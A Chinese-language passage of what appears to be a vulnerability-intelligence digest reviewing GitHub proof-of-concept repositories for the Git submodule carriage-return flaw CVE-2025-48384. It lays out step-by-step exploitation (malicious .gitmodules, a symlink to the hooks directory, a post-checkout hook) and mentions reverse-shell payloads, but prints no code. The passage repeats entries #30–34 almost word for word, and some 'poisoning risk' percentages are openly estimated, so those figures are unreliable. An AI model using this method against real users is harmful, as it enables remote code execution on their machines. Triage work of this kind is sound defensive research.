提供的PoC代码是一个反弹shell的`post-checkout`钩子脚本，如果成功执行，将允许攻击者控制受害者的系统。由于提供的poc代码功能单一,仅仅是反弹shell,没有进行额外的恶意代码操作,判定投毒风险为0%。根据搜索引擎结果，该漏洞已经被CISA添加到已知被利用的漏洞目录中，表明该漏洞在野外已被积极利用。


**项目地址:** [wzx5002/totallynotsuspicious](https://github.com/wzx5002/totallynotsuspicious)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---



---

## POC #30

**来源**: [CVE-2025-48384-testdjshan_CVE-2025-48384.md](../2025/CVE-2025-48384-testdjshan_CVE-2025-48384.md)

## CVE-2025-48384-Git-任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 受影响版本：< 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 用户需要克隆包含恶意配置的仓库

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-48384 允许攻击者通过在 Git 配置文件中注入恶意代码来执行任意命令。漏洞利用主要围绕 Git 如何处理带有回车符的配置值。如果 submodule 路径包含尾随的回车符 (CR)，则修改后的路径会被读取，导致 submodule 被检出到错误的位置。如果存在一个符号链接，将修改后的路径指向 submodule hooks 目录，并且 submodule 包含一个可执行的 post-checkout hook，则该脚本可能会在检出后被意外执行，导致任意代码执行。

**有效性：**

根据漏洞库信息和搜索结果，此漏洞是有效的。已发布了针对此漏洞的修复程序。

**投毒风险：**

提供的 POC 代码包含以下文件：

*   `README.md`: 一个空的 README 文件
*   `sub`:  一个 `.git/modules/sub/hooks` 目录。

`sub` 目录本身并不包含任何可执行代码，仅仅是一个空的hooks目录，因此直接投毒的可能性较低。但是,攻击者可能在受害者执行 `git clone --recursive`后，通过 submodule 初始化过程创建恶意的 hooks 文件或者修改 `.gitmodules` 文件来间接投毒。因此，存在一定的投毒风险，但风险等级较低。

**利用方式：**

1.  **创建恶意仓库：** 攻击者创建一个包含恶意的 `.gitmodules` 文件的 Git 仓库。该文件中的 submodule 路径包含一个尾随的回车符 (CR)。
2.  **设置符号链接：**  在仓库中创建一个符号链接，该链接将包含回车符的路径指向 submodule 的 `hooks` 目录。
3.  **添加恶意 hook：**  在 submodule 的 `hooks` 目录中添加一个恶意的 post-checkout hook 脚本。当用户执行 `git clone --recursive` 命令时，Git 会将 submodule 检出到错误的位置，由于存在符号链接，恶意的 post-checkout hook 将会被执行，从而导致任意代码执行。

**风险分析：**

该漏洞的利用需要用户执行 `git clone --recursive` 命令，并且依赖于用户机器上的 Git 版本存在漏洞。攻击的复杂性较高，需要精心的构造恶意仓库，但是如果成功利用，可以导致远程代码执行，因此风险等级较高。

**搜索引擎结果分析：**

*   NVD 提供了漏洞的详细信息和更新记录。
*   Red Hat 将此漏洞标记为“重要”，强调了其对 Git 路径和配置完整性的威胁。
*   dgl.cx 的文章详细介绍了利用此漏洞进行 RCE 的方法。


**项目地址:** [testdjshan/CVE-2025-48384](https://github.com/testdjshan/CVE-2025-48384)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #31

**来源**: [CVE-2025-48384-vinieger_CVE-2025-48384-bad-nginx-submodule.md](../2025/CVE-2025-48384-vinieger_CVE-2025-48384-bad-nginx-submodule.md)

## CVE-2025-48384-Git配置注入导致任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 配置注入/符号链接攻击

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户交互(克隆恶意仓库或初始化恶意子模块)

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384 漏洞允许攻击者通过在 Git 配置中注入包含回车符的恶意数据来执行任意代码。该漏洞的核心在于 Git 处理配置文件中带有尾随回车符的值时存在缺陷。具体来说，当 Git 写入包含尾随回车符的配置条目时，它不会对该值进行引用，导致回车符在后续读取时丢失。这会影响子模块的初始化过程，如果子模块路径包含尾随回车符，则会导致子模块被检出到错误的位置。攻击者可以利用这一点，通过创建一个指向子模块 hooks 目录的符号链接，并在子模块中包含一个可执行的 post-checkout hook。当用户克隆包含恶意配置的仓库或初始化恶意子模块时，`post-checkout` 钩子会被执行，从而导致任意代码执行。

提供的POC利用代码通过`post-checkout` hook 替换系统中的nginx程序，连接攻击者的服务器，反弹shell。 

**漏洞利用方式：**

1.  攻击者创建一个包含恶意 `.gitmodules` 文件的 Git 仓库。该文件包含一个子模块定义，其路径包含一个尾随回车符。
2.  攻击者在仓库中创建一个符号链接，将带有回车符的子模块路径指向 `.git/modules/<submodule>/hooks` 目录。
3.  攻击者在子模块的 hooks 目录中创建一个 `post-checkout` 钩子脚本，该脚本包含要执行的恶意代码。
4.  攻击者将恶意仓库托管在公共平台上或通过其他方式分发给目标用户。
5.  当目标用户克隆恶意仓库或初始化恶意子模块时，Git 会尝试将子模块检出到错误的位置，由于存在符号链接，实际上会将子模块检出到 `.git/modules/<submodule>/hooks` 目录。
6.  在子模块检出后，`post-checkout` 钩子脚本会被执行，从而导致攻击者指定的任意代码在目标系统上运行。

**有效性：**

该POC代码是有效的，可以用于利用 CVE-2025-48384 漏洞执行任意代码。

**投毒风险：**

该POC代码的功能明确，旨在利用该漏洞。从代码逻辑来看，并没有发现隐藏的恶意功能或者后门，可以判定没有投毒风险。

**搜索引擎结果分析：**

搜索结果表明该漏洞是Git配置注入/符号链接攻击漏洞，并且得到了安全社区的广泛关注，各大厂商都发布了安全更新。

**项目地址:** [vinieger/CVE-2025-48384-bad-nginx-submodule](https://github.com/vinieger/CVE-2025-48384-bad-nginx-submodule)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #32

**来源**: [CVE-2025-48384-vinieger_CVE-2025-48384-bad-nginx.md](../2025/CVE-2025-48384-vinieger_CVE-2025-48384-bad-nginx.md)

## CVE-2025-48384-Git Config Quoting Vulnerability

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致任意代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户交互(克隆恶意仓库或初始化包含恶意配置的子模块)

**POC 可用性:** 部分

**投毒风险:** 10%

## 详情

CVE-2025-48384 漏洞源于 Git 在处理配置引用时存在缺陷，允许攻击者通过精心构造的 Git 仓库或子模块执行任意代码。漏洞的利用方式是：攻击者创建一个恶意仓库，该仓库包含一个带有尾随回车符的子模块路径，并在子模块的 hooks 目录中放置恶意 post-checkout hook。当用户克隆该仓库或初始化包含恶意配置的子模块时，由于 Git 会错误地解析带有尾随回车符的子模块路径，导致子模块被检出到错误的位置。如果该错误位置恰好是一个指向子模块 hooks 目录的符号链接，并且子模块包含一个可执行的 post-checkout hook，则该脚本可能会在检出后被意外执行，从而导致代码执行。 

提供的 POC 代码 `/tmp/4295def0b61cc2e3ec2165152003d4b7/README.md` 看起来只是一个 README 文件，表明该仓库很可能是漏洞的利用示例或者演示。根据文件名`CVE-2025-48384-bad-nginx`推测,该代码仓库可能包含一个用于利用此漏洞的恶意Nginx配置。

**有效性：** 漏洞本身是有效的，因为多个来源都证实了它的存在。然而，仅凭提供的 POC 代码片段 `/tmp/4295def0b61cc2e3ec2165152003d4b7/README.md`无法判断具体的漏洞利用方式和有效性。需要查看完整的仓库内容才能确定其利用方式是否有效。

**投毒风险：** 仅根据提供的 README 文件，无法确定是否存在投毒代码。恶意代码可能隐藏在其他文件中（例如子模块的 hook 脚本或Nginx配置）。根据经验，安全研究人员倾向于展示漏洞利用过程,因此，仓库作者主动投毒的可能性较低，估计投毒风险为 10%。该仓库可能需要配合其他步骤,例如修改Nginx配置或者安装特定的依赖,来达到利用效果，这些步骤中可能包含潜在的风险。

**利用方式：** 攻击者诱导用户克隆包含恶意配置的仓库（带有尾随回车符的子模块路径以及恶意的post-checkout hook),从而触发代码执行。

由于搜索引擎返回了大量的相关信息，表明此漏洞是真实且被广泛关注的。SUSE和RedHat都发布了安全公告，更证明了该漏洞的存在。


**项目地址:** [vinieger/CVE-2025-48384-bad-nginx](https://github.com/vinieger/CVE-2025-48384-bad-nginx)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #33

**来源**: [CVE-2025-48384-vinieger_vinieger-CVE-2025-48384-Dockerfile.md](../2025/CVE-2025-48384-vinieger_vinieger-CVE-2025-48384-Dockerfile.md)

## CVE-2025-48384-Git配置注入导致任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 配置注入/符号链接攻击

**影响应用:** Git

**危害等级:** 高危，允许攻击者执行任意代码

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 用户需要克隆包含恶意配置的仓库并递归初始化子模块，并需要用户交互

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-48384是Git中的一个漏洞，由于Git在处理配置文件时，会删除尾部的CRLF字符，导致如果子模块路径中包含尾部CR字符，则修改后的路径会被读取，导致子模块被检出到错误的位置。如果存在一个符号链接将更改后的路径指向子模块的hooks目录，并且子模块包含一个可执行的post-checkout hook，则在检出后可能会意外执行该脚本，从而导致任意代码执行。 

**有效性：**

根据提供的漏洞库信息和搜索引擎结果，以及POC代码，可以判断此POC有效。POC Dockerfile使用`apk`安装了受影响的Git版本（2.40.4），然后克隆了两个包含利用代码的Git仓库。Dockerfile中的CMD指令执行了`git clone --recurse-submodules`命令，这会触发漏洞利用。搜索引擎结果中也提到了此漏洞存在POC，并提供了利用示例，表明此漏洞可以被复现。

**投毒风险：**

分析Dockerfile的内容，主要的风险点集中在克隆的两个Git仓库：`https://github.com/vinieger/CVE-2025-48384.git`和`https://github.com/liamg/CVE-2025-48384-submodule.git`。

*   检查`vinieger/CVE-2025-48384`仓库，该仓库主要用于提供触发漏洞的配置，风险较低，因为目标是演示漏洞本身。
*   `liamg/CVE-2025-48384-submodule` 仓库，它用于提供恶意的子模块。恶意代码最可能存在于子模块的hooks目录中，尤其是post-checkout hook。该仓库需要仔细审查。考虑到其目的是为了利用漏洞，因此其存在恶意代码的可能性较高，但主要用于演示漏洞利用而非进行大规模攻击。因此，投毒风险相对较低，估计在10%左右，主要源于该仓库可能隐藏一些超出漏洞演示范围的恶意行为（例如，收集用户信息或尝试横向渗透）。

**利用方式：**

1.  攻击者创建一个包含恶意配置的Git仓库，该配置包括带有尾部CR字符的子模块路径。
2.  攻击者创建一个包含恶意post-checkout hook的子模块，并将该子模块托管在另一个Git仓库。
3.  攻击者创建一个符号链接，将带有尾部CR字符的子模块路径指向子模块的hooks目录。
4.  受害者克隆包含恶意配置的Git仓库，并使用`git clone --recurse-submodules`命令初始化子模块。
5.  Git在处理子模块路径时，会错误地将子模块检出到符号链接指向的目录，从而执行恶意post-checkout hook，导致任意代码执行。

**项目地址:** [vinieger/vinieger-CVE-2025-48384-Dockerfile](https://github.com/vinieger/vinieger-CVE-2025-48384-Dockerfile)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #34

**来源**: [CVE-2025-48384-won6c_CVE-2025-48384-submodule.md](../2025/CVE-2025-48384-won6c_CVE-2025-48384-submodule.md)

## CVE-2025-48384-Git-任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户交互（克隆恶意仓库）和存在易受攻击的 Git 版本。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384 存在于 Git 中，源于其对配置中回车符处理不当。攻击者可以通过在 submodule 路径中注入回车符，导致 submodule 被检出到错误的位置。如果存在一个符号链接将该错误路径指向 submodule 钩子目录，且 submodule 包含可执行的 post-checkout 钩子，则在检出后可能会意外执行该脚本，造成任意代码执行。

**有效性：**
根据 arcticwolf.com 的搜索结果表明，此漏洞存在可用的 PoC。 提供的 PoC 代码 `/tmp/b95b758d8faf22baf81ee61a8796e533/README.md` 只是一个 dummy submodule 的 README 文件，本身不具备利用漏洞的能力。 完整的 PoC 应当包含恶意的 submodule 配置和 hook 文件。

**投毒风险：**
提供的 PoC 代码不包含任何恶意代码，因此投毒风险为 0%。 但是，实际利用中，攻击者会构建包含恶意 hook 脚本的 submodule，从而在用户克隆并初始化 submodule 时执行恶意代码。

**利用方式：**
1.  攻击者创建一个包含恶意 submodule 的 Git 仓库。
2.  在 submodule 的路径中注入回车符。
3.  创建一个符号链接，将包含回车符的错误路径指向 submodule 的钩子目录 (.git/hooks)。
4.  在 submodule 中添加一个恶意的 post-checkout 钩子脚本。
5.  诱导用户克隆该仓库并初始化 submodule (git submodule update --init --recursive)。
6.  当用户检出 submodule 时，由于路径包含回车符，submodule 会被检出到错误的位置，触发符号链接，执行钩子目录下的恶意脚本，从而实现任意代码执行。

**项目地址:** [won6c/CVE-2025-48384-submodule](https://github.com/won6c/CVE-2025-48384-submodule)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #35

**来源**: [CVE-2025-48384-wzx5002_totallynotsuspicious.md](../2025/CVE-2025-48384-wzx5002_totallynotsuspicious.md)

## CVE-2025-48384-Git-RCE

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 远程代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行和系统控制

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户克隆包含恶意配置的仓库或初始化包含恶意配置的子模块

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384是Git中的一个高危漏洞，源于Git在处理包含回车符的配置值时，读取和写入方式不一致。攻击者可以利用这个漏洞，通过构造包含恶意配置（例如，带有尾随回车符的子模块路径）的Git仓库，诱导受害者克隆该仓库，从而实现远程代码执行。具体利用方式是：

1.  **恶意仓库创建：** 攻击者创建一个包含恶意`.gitmodules`文件的Git仓库。该文件中的子模块路径包含一个尾随的回车符(`\r`)。
2.  **符号链接利用：** 当受害者使用`git submodule init`初始化子模块时，Git会错误地解析子模块路径。攻击者在仓库中创建一个符号链接，将错误的子模块路径指向`.git/hooks`目录。
3.  **恶意钩子：**  攻击者在子模块中包含一个恶意的`post-checkout`钩子脚本。该脚本会在`git checkout`操作后自动执行。
4.  **诱导受害者：** 攻击者诱导受害者克隆恶意仓库并初始化子模块（例如，通过`git clone --recursive`或手动执行`git submodule init`和`git submodule update`）。
5.  **代码执行：** 当受害者检出（checkout）仓库时，`post-checkout`钩子脚本会被执行，从而导致远程代码执行。

提供的PoC代码是一个反弹shell的`post-checkout`钩子脚本，如果成功执行，将允许攻击者控制受害者的系统。由于提供的poc代码功能单一,仅仅是反弹shell,没有进行额外的恶意代码操作,判定投毒风险为0%。根据搜索引擎结果，该漏洞已经被CISA添加到已知被利用的漏洞目录中，表明该漏洞在野外已被积极利用。


**项目地址:** [wzx5002/totallynotsuspicious](https://github.com/wzx5002/totallynotsuspicious)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---



---

## POC #30

**来源**: [CVE-2025-48384-testdjshan_CVE-2025-48384.md](../2025/CVE-2025-48384-testdjshan_CVE-2025-48384.md)

## CVE-2025-48384-Git-任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 受影响版本：< 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 用户需要克隆包含恶意配置的仓库

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-48384 允许攻击者通过在 Git 配置文件中注入恶意代码来执行任意命令。漏洞利用主要围绕 Git 如何处理带有回车符的配置值。如果 submodule 路径包含尾随的回车符 (CR)，则修改后的路径会被读取，导致 submodule 被检出到错误的位置。如果存在一个符号链接，将修改后的路径指向 submodule hooks 目录，并且 submodule 包含一个可执行的 post-checkout hook，则该脚本可能会在检出后被意外执行，导致任意代码执行。

**有效性：**

根据漏洞库信息和搜索结果，此漏洞是有效的。已发布了针对此漏洞的修复程序。

**投毒风险：**

提供的 POC 代码包含以下文件：

*   `README.md`: 一个空的 README 文件
*   `sub`:  一个 `.git/modules/sub/hooks` 目录。

`sub` 目录本身并不包含任何可执行代码，仅仅是一个空的hooks目录，因此直接投毒的可能性较低。但是,攻击者可能在受害者执行 `git clone --recursive`后，通过 submodule 初始化过程创建恶意的 hooks 文件或者修改 `.gitmodules` 文件来间接投毒。因此，存在一定的投毒风险，但风险等级较低。

**利用方式：**

1.  **创建恶意仓库：** 攻击者创建一个包含恶意的 `.gitmodules` 文件的 Git 仓库。该文件中的 submodule 路径包含一个尾随的回车符 (CR)。
2.  **设置符号链接：**  在仓库中创建一个符号链接，该链接将包含回车符的路径指向 submodule 的 `hooks` 目录。
3.  **添加恶意 hook：**  在 submodule 的 `hooks` 目录中添加一个恶意的 post-checkout hook 脚本。当用户执行 `git clone --recursive` 命令时，Git 会将 submodule 检出到错误的位置，由于存在符号链接，恶意的 post-checkout hook 将会被执行，从而导致任意代码执行。

**风险分析：**

该漏洞的利用需要用户执行 `git clone --recursive` 命令，并且依赖于用户机器上的 Git 版本存在漏洞。攻击的复杂性较高，需要精心的构造恶意仓库，但是如果成功利用，可以导致远程代码执行，因此风险等级较高。

**搜索引擎结果分析：**

*   NVD 提供了漏洞的详细信息和更新记录。
*   Red Hat 将此漏洞标记为“重要”，强调了其对 Git 路径和配置完整性的威胁。
*   dgl.cx 的文章详细介绍了利用此漏洞进行 RCE 的方法。


**项目地址:** [testdjshan/CVE-2025-48384](https://github.com/testdjshan/CVE-2025-48384)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #31

**来源**: [CVE-2025-48384-vinieger_CVE-2025-48384-bad-nginx-submodule.md](../2025/CVE-2025-48384-vinieger_CVE-2025-48384-bad-nginx-submodule.md)

## CVE-2025-48384-Git配置注入导致任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 配置注入/符号链接攻击

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户交互(克隆恶意仓库或初始化恶意子模块)

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384 漏洞允许攻击者通过在 Git 配置中注入包含回车符的恶意数据来执行任意代码。该漏洞的核心在于 Git 处理配置文件中带有尾随回车符的值时存在缺陷。具体来说，当 Git 写入包含尾随回车符的配置条目时，它不会对该值进行引用，导致回车符在后续读取时丢失。这会影响子模块的初始化过程，如果子模块路径包含尾随回车符，则会导致子模块被检出到错误的位置。攻击者可以利用这一点，通过创建一个指向子模块 hooks 目录的符号链接，并在子模块中包含一个可执行的 post-checkout hook。当用户克隆包含恶意配置的仓库或初始化恶意子模块时，`post-checkout` 钩子会被执行，从而导致任意代码执行。

提供的POC利用代码通过`post-checkout` hook 替换系统中的nginx程序，连接攻击者的服务器，反弹shell。 

**漏洞利用方式：**

1.  攻击者创建一个包含恶意 `.gitmodules` 文件的 Git 仓库。该文件包含一个子模块定义，其路径包含一个尾随回车符。
2.  攻击者在仓库中创建一个符号链接，将带有回车符的子模块路径指向 `.git/modules/<submodule>/hooks` 目录。
3.  攻击者在子模块的 hooks 目录中创建一个 `post-checkout` 钩子脚本，该脚本包含要执行的恶意代码。
4.  攻击者将恶意仓库托管在公共平台上或通过其他方式分发给目标用户。
5.  当目标用户克隆恶意仓库或初始化恶意子模块时，Git 会尝试将子模块检出到错误的位置，由于存在符号链接，实际上会将子模块检出到 `.git/modules/<submodule>/hooks` 目录。
6.  在子模块检出后，`post-checkout` 钩子脚本会被执行，从而导致攻击者指定的任意代码在目标系统上运行。

**有效性：**

该POC代码是有效的，可以用于利用 CVE-2025-48384 漏洞执行任意代码。

**投毒风险：**

该POC代码的功能明确，旨在利用该漏洞。从代码逻辑来看，并没有发现隐藏的恶意功能或者后门，可以判定没有投毒风险。

**搜索引擎结果分析：**

搜索结果表明该漏洞是Git配置注入/符号链接攻击漏洞，并且得到了安全社区的广泛关注，各大厂商都发布了安全更新。

**项目地址:** [vinieger/CVE-2025-48384-bad-nginx-submodule](https://github.com/vinieger/CVE-2025-48384-bad-nginx-submodule)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #32

**来源**: [CVE-2025-48384-vinieger_CVE-2025-48384-bad-nginx.md](../2025/CVE-2025-48384-vinieger_CVE-2025-48384-bad-nginx.md)

## CVE-2025-48384-Git Config Quoting Vulnerability

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致任意代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户交互(克隆恶意仓库或初始化包含恶意配置的子模块)

**POC 可用性:** 部分

**投毒风险:** 10%

## 详情

CVE-2025-48384 漏洞源于 Git 在处理配置引用时存在缺陷，允许攻击者通过精心构造的 Git 仓库或子模块执行任意代码。漏洞的利用方式是：攻击者创建一个恶意仓库，该仓库包含一个带有尾随回车符的子模块路径，并在子模块的 hooks 目录中放置恶意 post-checkout hook。当用户克隆该仓库或初始化包含恶意配置的子模块时，由于 Git 会错误地解析带有尾随回车符的子模块路径，导致子模块被检出到错误的位置。如果该错误位置恰好是一个指向子模块 hooks 目录的符号链接，并且子模块包含一个可执行的 post-checkout hook，则该脚本可能会在检出后被意外执行，从而导致代码执行。 

提供的 POC 代码 `/tmp/4295def0b61cc2e3ec2165152003d4b7/README.md` 看起来只是一个 README 文件，表明该仓库很可能是漏洞的利用示例或者演示。根据文件名`CVE-2025-48384-bad-nginx`推测,该代码仓库可能包含一个用于利用此漏洞的恶意Nginx配置。

**有效性：** 漏洞本身是有效的，因为多个来源都证实了它的存在。然而，仅凭提供的 POC 代码片段 `/tmp/4295def0b61cc2e3ec2165152003d4b7/README.md`无法判断具体的漏洞利用方式和有效性。需要查看完整的仓库内容才能确定其利用方式是否有效。

**投毒风险：** 仅根据提供的 README 文件，无法确定是否存在投毒代码。恶意代码可能隐藏在其他文件中（例如子模块的 hook 脚本或Nginx配置）。根据经验，安全研究人员倾向于展示漏洞利用过程,因此，仓库作者主动投毒的可能性较低，估计投毒风险为 10%。该仓库可能需要配合其他步骤,例如修改Nginx配置或者安装特定的依赖,来达到利用效果，这些步骤中可能包含潜在的风险。

**利用方式：** 攻击者诱导用户克隆包含恶意配置的仓库（带有尾随回车符的子模块路径以及恶意的post-checkout hook),从而触发代码执行。

由于搜索引擎返回了大量的相关信息，表明此漏洞是真实且被广泛关注的。SUSE和RedHat都发布了安全公告，更证明了该漏洞的存在。


**项目地址:** [vinieger/CVE-2025-48384-bad-nginx](https://github.com/vinieger/CVE-2025-48384-bad-nginx)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #33

**来源**: [CVE-2025-48384-vinieger_vinieger-CVE-2025-48384-Dockerfile.md](../2025/CVE-2025-48384-vinieger_vinieger-CVE-2025-48384-Dockerfile.md)

## CVE-2025-48384-Git配置注入导致任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 配置注入/符号链接攻击

**影响应用:** Git

**危害等级:** 高危，允许攻击者执行任意代码

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 用户需要克隆包含恶意配置的仓库并递归初始化子模块，并需要用户交互

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-48384是Git中的一个漏洞，由于Git在处理配置文件时，会删除尾部的CRLF字符，导致如果子模块路径中包含尾部CR字符，则修改后的路径会被读取，导致子模块被检出到错误的位置。如果存在一个符号链接将更改后的路径指向子模块的hooks目录，并且子模块包含一个可执行的post-checkout hook，则在检出后可能会意外执行该脚本，从而导致任意代码执行。 

**有效性：**

根据提供的漏洞库信息和搜索引擎结果，以及POC代码，可以判断此POC有效。POC Dockerfile使用`apk`安装了受影响的Git版本（2.40.4），然后克隆了两个包含利用代码的Git仓库。Dockerfile中的CMD指令执行了`git clone --recurse-submodules`命令，这会触发漏洞利用。搜索引擎结果中也提到了此漏洞存在POC，并提供了利用示例，表明此漏洞可以被复现。

**投毒风险：**

分析Dockerfile的内容，主要的风险点集中在克隆的两个Git仓库：`https://github.com/vinieger/CVE-2025-48384.git`和`https://github.com/liamg/CVE-2025-48384-submodule.git`。

*   检查`vinieger/CVE-2025-48384`仓库，该仓库主要用于提供触发漏洞的配置，风险较低，因为目标是演示漏洞本身。
*   `liamg/CVE-2025-48384-submodule` 仓库，它用于提供恶意的子模块。恶意代码最可能存在于子模块的hooks目录中，尤其是post-checkout hook。该仓库需要仔细审查。考虑到其目的是为了利用漏洞，因此其存在恶意代码的可能性较高，但主要用于演示漏洞利用而非进行大规模攻击。因此，投毒风险相对较低，估计在10%左右，主要源于该仓库可能隐藏一些超出漏洞演示范围的恶意行为（例如，收集用户信息或尝试横向渗透）。

**利用方式：**

1.  攻击者创建一个包含恶意配置的Git仓库，该配置包括带有尾部CR字符的子模块路径。
2.  攻击者创建一个包含恶意post-checkout hook的子模块，并将该子模块托管在另一个Git仓库。
3.  攻击者创建一个符号链接，将带有尾部CR字符的子模块路径指向子模块的hooks目录。
4.  受害者克隆包含恶意配置的Git仓库，并使用`git clone --recurse-submodules`命令初始化子模块。
5.  Git在处理子模块路径时，会错误地将子模块检出到符号链接指向的目录，从而执行恶意post-checkout hook，导致任意代码执行。

**项目地址:** [vinieger/vinieger-CVE-2025-48384-Dockerfile](https://github.com/vinieger/vinieger-CVE-2025-48384-Dockerfile)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #34

**来源**: [CVE-2025-48384-won6c_CVE-2025-48384-submodule.md](../2025/CVE-2025-48384-won6c_CVE-2025-48384-submodule.md)

## CVE-2025-48384-Git-任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户交互（克隆恶意仓库）和存在易受攻击的 Git 版本。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384 存在于 Git 中，源于其对配置中回车符处理不当。攻击者可以通过在 submodule 路径中注入回车符，导致 submodule 被检出到错误的位置。如果存在一个符号链接将该错误路径指向 submodule 钩子目录，且 submodule 包含可执行的 post-checkout 钩子，则在检出后可能会意外执行该脚本，造成任意代码执行。

